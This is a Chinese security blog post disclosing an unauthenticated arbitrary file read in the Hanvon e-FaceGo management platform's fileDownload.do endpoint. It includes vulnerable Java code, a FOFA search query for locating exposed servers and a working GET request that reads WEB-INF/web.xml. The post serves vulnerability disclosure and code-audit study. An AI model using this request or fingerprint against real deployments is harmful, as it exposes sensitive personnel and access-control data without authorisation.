---
title: "汉王e脸通综合管理平台 fileDownload.do 任意文件读取漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-personnel-fileDownload-fileread.html
asset_dir: assets/汉王e脸通综合管理平台-filedownload.do-任意文件读取漏洞
---

# 汉王e脸通综合管理平台 fileDownload.do 任意文件读取漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/6 08:27
* 762浏览
* [0评论](#comment)
* 18分钟阅读

深入探索

软件

信息安全

认证


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理软件，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `fileDownload.do` 接口存在任意文件读取漏洞。攻击者可在无需认证的情况下，通过构造恶意请求访问 `fileDownload.do` 接口，传入任意文件路径参数，实现服务器上任意文件的读取，影响系统敏感数据的泄露和信息安全。

# 影响版本

v1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

直接看 `PersonnelController` 下的 `fileDownload.do` 实现方式

```
@ResponseBody
    @RequestMapping(
        value = {"/fileDownload.do"},
        method = {RequestMethod.GET}
    )
    public void fileUpload(@RequestParam(required = true) String fileId, HttpServletResponse response) {
        try {
            if (fileId.equals("undefined")) {
                return;
            }

            File file = new File(TheApp.getRootPath(fileId));
            String[] split = fileId.split("/");
            String fileName = split[split.length - 1];
            response.setContentType("application/octet-stream;charset=utf-8");
            response.setHeader("Content-Disposition", "attachment;fileName=" + fileName);
            ServletOutputStream outputStream = response.getOutputStream();
            FileInputStream fileInputStream = new FileInputStream(file);
            loadFile(outputStream, fileInputStream);
            closeIO(outputStream, fileInputStream);
        } catch (IOException e) {
            String msg = getMessage("basics_go_wrong") + e.getMessage();
            logger.error(msg);
        }

    }
```

深入探索

网络安全会议

文本剥离工具

SQL注入防护

跟进 `TheApp.getRootPath` 方法

```
public static String getRootPath(String path) {
    StringBuilder rootPath = new StringBuilder(webPath);
    rootPath.append(File.separator).append(path);
    return rootPath.toString();
}
```

对用户可控参数 `fileId` 无任何过滤或校验，直接拼接路径返回文件路径进行文件操作，也是朴实无华的任意[文件读取漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)。

# 漏洞复现

```
GET /manage/personnel/fileDownload.do?fileId=/WEB-INF/web.xml&recoToken=SGUsqvF7cVS HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 fileDownload.do 任意文件读取漏洞](images/img-001-6e5fc379f424.webp)](https://image.mrxn.net/31eecc4410174d7d82c49c0219c6f532.webp)

成功读取到 `web.xml` 文件

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[汉王e脸通综合管理平台 fileDownload.do 任意文件读取漏洞](https://mrxn.net/jswz/hanvon-efacego-personnel-fileDownload-fileread.html)  
文章链接：<https://mrxn.net/jswz/hanvon-efacego-personnel-fileDownload-fileread.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-personnel-fileDownload-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALg0lEQVR4AeybgXbbuA5Efff//3lfkcmVRUi03DbP9jlLn6KjGQxAhpAau2n/ud1u//5J/Pv9svabbtB1+RVuDSYXj+p7iV51uag+Q33ilc+8/j/BGsivuvXrU05gG8iv6d6eidnGgRvcw17df6XDvQewlQNf/RVmfcwX6oHUyitXAdHrugLCITjzQ/IQrNqzsP4K97XbQPbiun7fCRwGApk6jHi1Re+CKx+kr34RznX76RPh6NcLyUFQ/Vl8tIa5wmf7QfYBI57VHwZyZlra607grwdSd0oFZPp1XeGXAOe6ebFqKiB+OMdH/p6b8SvdvAjjXtTF2neF/G/wrwfyN4uv2uMJ/PhAYLyb6s6pgOhuAUauXt4KeUdIHQT3eYgGwepToQd+T6/afdhHNCf/CfzxgfzEpv7LPQ4DceodZ4cE4133VfdvffgfK2a6LkgfeffPuPoe7dFRz0yH7AGC+iDcegg3f4XWdTyrOwzkzLS0153ANhDI1OExXm0NUu/dAOG9ruc77/4Zh/QHZpavT/hwzwNfmgUQ7h7Un0VIffdDdHiM+7ptIHtxXb/vBP7xrvhd7FuG3AXqMHJ1EcY8/B63z37faiKc97QGkpdb17k6POe3/k9wPSGe9ofgYSCQuwBGdL8QXd7Ru0K9c/Ur7HWdQ/YBR+y9rRXNdw7pZR7C9YkQvfsgOoyoT4QxD3d+GIhFC99zAv9ApjNbvt8V8plfvfsg66h3tE6E+Gdcfd9H7QohvSGo314zDvFf+ay/QvvscT0hV6f24vw2EMj0Xd+pdQ6Pffph9Kl3hPhm6+30r9LOv8Tv38yJ3/IGcL4WRIdztIF9IT51CDcvmhdh9EE43HEbiEUL33sC2+cQt+F04T41wPT2c3dg+LS7Gb4v7PNNDwBjPTzmvYH9IXVwR73doy6av0L9M7Qe7nsADmelr/dRL1xPSD+dN/PpQGpa+4Bx+rN9w+iDcHtZ17l6RxjrIRyC9instTMOqTUPI+86JA/BWqsCwiFYWkWvL60C4oOgvj1OB7I3revXncDlQCDTrAnvo29xn9tf64P06Vyvesee77z7i8O4Vml/Eq4lznrM8uqQ/cg77vteDmRvXtf//xOYDgQyVbcA4RDsulyE0eddYV6E+Mx37D4Y/RAOaN3e3WzCkxfA1ztHCFoG4e4Nwnte3n2d6xMh/YDbdCC39XrLCUwH4lTdlXyG+q4Qcjf0PtZB8nJRv/wZhPSyVhxqf5Gud/7LMvya5SHradYH0eXmRfXC6UA0L3ztCRwGApnmbBuQPARnvpp2hXmIv7QKCJ/l1UWIv2or1PdYeoVaXVfIYewB4RAsb0X3z7h61exDHca+EA4j6i88DKTEFe87gcNAnDRkin1r5kWID4LP+nu9dZA+MOLMr15oj46QXuWpMF/X+4D4zHfUqy6H1EHQvAjnuvX6Cg8DKXHF+07g8BNDyDT79CA6BN3yzGce4odg9+tTn2H3QfrBHfXAXQOUh88YwMY1uLa8I6RGHUZuPYy6frH7IH5gfQ65fdhr+kcWZGru16mK6hBf182ri+ow1kG4+Y5wnrdvoTV1XfEsh/SGEWf1EF+tUaHvCstboa+ue0wHYtHC157AYSBObLYNyN0BQX3wHIfHPvtdofuE9AO2EuDr+0P3dG6B+oxD+pkX4Vy/3W5avrD3h9RB8Mv0/dthIN/6gjedwOFn6pCpOVURRt39mhfVO5rvqE9dDlkPgj2v7wy7t/NeA8+tYZ8ZQvrYX59cVBfVC9cTUqfwQXE5EBinDuccojt18ae/Vsg6ENz3h2hwjnvv/tq9wlinx7wcRh+EmxchOgTVRYgOd7wciMULX3MC2yf1fhf05c131KcO92kDpg8IfL0TOiS+Bft90wOYP0PN5uSiutj1GVcXZ/Xqov5ncD0hz5zSCz3bQODxHeue4NwHo+7dAaMOI7/qax99HSH9gJ46cGB4KiEcRrQQznXzM4TUXeX92va4DWRWvPTXnsAayGvP+3K1w0B8fKryLGb5Kx3yGOsTXaNzdRFSLxetK1SbYXkqzNd1Reel7cO8aA4e70n/DOFYfxjIrHjprzmBbSBXU4dME0Z0mxB9xu0/y6t3hLGveYgOR+we14Z4e14uwuizfpbvOqQegubFWT9g/YDq9mGvw18uuj94PF2nLFrXOZz30S9CfBBU7/26bn6P3SPvaM1Mh3EvEG6dOKtXf9ZX/u2PrCIr3n8Ch4H0acpFyF0CQb+EnlcXYfSrW9fRPIx1+sw/QnhcC8lf9YT4XAvCIaje+3QO8UOw15X/MBBNC99zAttfLro8jNPrek2xQr1j5SrU63of6iJkPQh2XT5DSB3cUa/ryuHugeN/ytR3hb3vld/8M3XrCfG0PgSn77LcH+SucroQ3vMw6uZFMB/Ffh0hvq7LIfl0uW3/Ocf8HiFeCPYaGHXzMOr7nnUNydf1PiA6BO0nwqhDONxxPSGe1ofgNhDIlJy4+3uWd5/1HSHrqEM4BHsfiA5B684Q4oGgHnuKcJ7X3xFG/1W+rwOpV3+E20D6Iou/5wS2d1lODcZpQrjbg5Grd+z9zKvLxa5D1lHvCMlbX6inrs8Cxporf89D6tUh3LW6LjcP8cOI5gvXE1Kn8EGxDQQytau9OXVRP6QegurizN/1K/8sr15oTxHGPc30qq24ypenQp8I4zoQbl6s2orOS9sGUmTF+0/g8DnEqcE4XbcK0WFE871e/QrhvB9Et699IDrc0ZwIyfVa8zMdzuv0Q/Iwon2fRRjrgfXzkNuHvbZ3We4LMrUZ9y4xL6rDWP+srs9+kD5dN9/xEYfHvSB5CLomnHPX0te5umhe7Lq8cH0P8ZQ+BLeB1HQq3FddV8ghdwsE1ctTAY/18lTA6LMPjHp5K2DUYeTlMWDM2bsjjD7rxZnfvAhjHxi5fSA6jNj7AOt7yO3DXtsT4r761OQd9Yvm5aI65O6Ycf0iPPb3PnD8+YYe0d5/ipA9WW/fjhAfBHveenGfPwxE08L3nMD2OQQyTbfh1OSQPAR7Xl9HGP0w8u6Xz/pD6ruv/DDm9Igw5uGcw6hbX2tUQPIwoj6xvBUQ30yH5IH1PeT2Ya/DH1lwnxawbbcmvQ9g+Kf9m/Hiwh4w1qv3coiv5yF69xfXC/FAsHL76D65HrkIYx91sdfB6Dff0frCw0C6efHXnsDhk7rL17Qq5CJk6pWrmOkw+iBcf9VWwKibF8tTIe8IqQe2FDA8vVV/FhCfOQi3EYRDUN8sD/FBUJ8I0SGovsf1hOxP4wOut3dZTl+c7a3nIdPueue9H6Su69bBmIeR6ztDe5qDsRbOuf5eL4exbuZXF62XdzRfuJ6QOoUPiu17CGT68Bz6NThtOaRe3hHGvPUQHYLq1neuDvEDShsCw/eSLdEu7A3xz7i62NpsFNJnE74vYNQhHO64npDvw/oU2Abi1K9wtnHIlM1DOATta14OyauLEB2C6h3tU9hz8spVyDtC1ihPBYxcP0SHEc2L1aNCLpZW0XlpxjYQTQvfewKHgcA4fQifbRMe52d1V7p3jAjjOhAOR7